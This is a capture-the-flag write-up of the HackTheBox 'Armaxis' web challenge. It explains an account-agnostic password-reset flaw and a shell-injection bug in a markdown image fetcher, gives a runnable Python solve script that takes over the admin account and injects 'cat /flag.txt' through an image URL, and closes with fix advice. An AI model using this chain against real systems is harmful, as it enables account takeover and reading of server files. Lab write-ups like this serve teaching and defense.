## Overview

`Armaxis` is a Very Easy HackTheBox **Web** challenge. The target is a Node/Express
"weapons dispatch" panel plus a companion mail-inbox web app, and the flag sits at
`/flag.txt` on the server. The path to it chains two independent bugs: a
[broken password-reset](https://cwe.mitre.org/data/definitions/640.html) that lets you
take over the admin account, and a markdown renderer that fetches images by shelling out
to `curl` — a textbook [OS command injection](https://cwe.mitre.org/data/definitions/78.html).

## The technique

Two weaknesses, used back to back:

**1. Password-reset token not bound to the account ([CWE-640](https://cwe.mitre.org/data/definitions/640.html)).**
The reset-confirm endpoint validates only that the submitted token *exists and is unexpired* —
it then applies the new password to an account named by an attacker-supplied `email` in the
*same* request. The token proves a reset was requested; it never says *which* account it
authorizes. So a token you legitimately mint for your own account resets anyone's password,
including the admin's.

**2. Markdown image handler shells out ([CWE-78](https://cwe.mitre.org/data/definitions/78.html)).**
The admin-only weapon-dispatch note is rendered through markdown-it, whose custom image
handler fetches the image URL by running `execSync(\`curl -s ${url}\`)`. The URL captured
from `![alt](url)` lands in a shell string with no quoting — so a shell metacharacter in
the URL injects commands, and because the command's output is base64'd into the rendered
`<img>` tag, the output comes straight back on the page (no outbound network needed).

## Solution

The two vulnerable handlers, abbreviated:

```js
// Bug 1 — reset confirm: account comes from the request body, not the token
const reset = await getPasswordReset(token);      // existence + TTL check only
const user  = await getUserByEmail(email);        // attacker-chosen email
await updateUserPassword(user.id, newPassword);

// Bug 2 — markdown image handler runs the URL through a shell
content.replace(/!\[.*?\]\((.*?)\)/g, (m, url) => {
    const out = execSync(`curl -s ${url}`);        // command injection
    return `<img src="data:image/*;base64,${out.toString('base64')}">`;
});
```

One wrinkle on bug 1: you have to *read* your reset token, and the inbox app only displays
mail sent to `test@email.htb` — so register your account as exactly that address.

The full chain, as a runnable `solve.py` (app and inbox are the two instance ports):

```python
import re, base64, requests

APP   = "http://TARGET:APP_PORT"     # the Armaxis panel
INBOX = "http://TARGET:INBOX_PORT"   # the mail inbox app
ME, ADMIN, NEW = "test@email.htb", "admin@armaxis.htb", "pwned123!"

s = requests.Session()
s.post(f"{APP}/register", data={"email": ME, "password": "x"})              # 1 register
s.post(f"{APP}/reset-password/request", data={"email": ME})                 # 2 request token
token = re.findall(r"[0-9a-f]{32}", s.get(f"{INBOX}/").text)[-1]            # 3 read token
s.post(f"{APP}/reset-password",                                             # 4 take over admin
       data={"token": token, "email": ADMIN, "newPassword": NEW})
s.post(f"{APP}/login", data={"email": ADMIN, "password": NEW})              # 5 admin cookie
s.post(f"{APP}/weapons/dispatch", data={                                    # 6 inject
    "name": "x", "price": "1", "dispatched_to": ADMIN,
    "note": "![a](http://127.0.0.1; cat /flag.txt #)"})
html = s.get(f"{APP}/weapons").text                                        # 7 read it back
blob = re.findall(r"base64,([A-Za-z0-9+/=]+)", html)[0]
print(re.search(r"HTB\{[^}]*\}", base64.b64decode(blob).decode()).group(0))
```

Running it walks register → token → admin takeover → injected dispatch → decode, and
prints the flag:

```
HTB{...}
```

(Flag value redacted.)

## Why it worked

The reset check validated the token's *existence*, not its *ownership* — an authorization
slip that reads as correct in review because the token-lookup logic itself is fine. And the
image handler reached for a shell (`execSync` + string interpolation) where an in-process
HTTP client belonged; reflecting the fetch output back on the page turned that into a clean
arbitrary-file-read primitive.

## Fix / defense

- **Reset:** derive the target account from the token record (`reset.user_id`) and never
  from a request-supplied identifier. Make tokens single-use with a short TTL.
- **Markdown:** fetch images with an in-process HTTP client (`axios.get(url)`); if a
  subprocess is truly unavoidable use `execFileSync('curl', [url])` with an argv array — never
  string concatenation — and allowlist the URL scheme and host.
